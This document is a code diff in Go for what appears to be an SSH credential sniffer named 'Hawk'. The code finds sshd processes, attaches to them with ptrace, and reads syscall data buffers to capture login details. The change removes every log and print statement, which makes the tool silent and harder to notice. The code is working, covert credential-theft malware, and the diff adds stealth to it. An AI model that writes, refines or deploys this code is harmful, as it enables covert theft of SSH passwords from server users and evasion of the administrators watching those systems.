@@ -17,12 +17,10 @@ func watchSSHDProcesses() {
 	for {
 		select {
 		case <-shutdownChan:
-			fmt.Println("Received shutdown signal. Exiting...")
 			return
 		default:
 			sshdPIDs, err := findSSHDProcesses()
 			if err != nil {
-				fmt.Printf("Error finding SSHD processes: %v\n", err)
 				time.Sleep(5 * time.Second)
 				continue
 			}
@@ -69,10 +67,8 @@ func isSSHDProcess(pid int) bool {
 }
 
 func traceSSHDProcess(pid int) {
-	fmt.Println("[Hawk] SSH Connection Identified.")
 	err := syscall.PtraceAttach(pid)
 	if err != nil {
-		fmt.Println("Error attaching to the process:", err)
 		return
 	}
 	defer syscall.PtraceDetach(pid)
@@ -80,20 +76,17 @@ func traceSSHDProcess(pid int) {
 	var status syscall.WaitStatus
 	_, err = syscall.Wait4(pid, &status, syscall.WSTOPPED, nil)
 	if err != nil {
-		fmt.Println("Error waiting for the process:", err)
 		return
 	}
 	var username string
 	for {
 		err = syscall.PtraceSyscall(pid, 0)
 		if err != nil {
-			fmt.Println("[Hawk] SSH Connection Closed.")
 			return
 		}
 
 		_, err = syscall.Wait4(pid, &status, 0, nil)
 		if err != nil {
-			fmt.Println("Error waiting for the process:", err)
 			return
 		}
 
@@ -104,7 +97,6 @@ func traceSSHDProcess(pid int) {
 			reg := &syscall.PtraceRegs{}
 			err := syscall.PtraceGetRegs(pid, reg)
 			if err != nil {
-				fmt.Println("Error getting registers:", err)
 				return
 			}
 
@@ -112,7 +104,6 @@ func traceSSHDProcess(pid int) {
 				buffer := make([]byte, reg.Rdx)
 				_, err := syscall.PtracePeekData(pid, uintptr(reg.Rsi), buffer)
 				if err != nil {
-					fmt.Println("Error reading buffer:", err)
 					return
 				}
 				cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
@@ -133,13 +124,11 @@ func traceSSHDProcess(pid int) {
 
 		err = syscall.PtraceSyscall(pid, 0)
 		if err != nil {
-			fmt.Println("Error continuing the process:", err)
 			return
 		}
 
 		_, err = syscall.Wait4(pid, &status, 0, nil)
 		if err != nil {
-			fmt.Println("Error waiting for the process:", err)
 			return
 		}
 	}
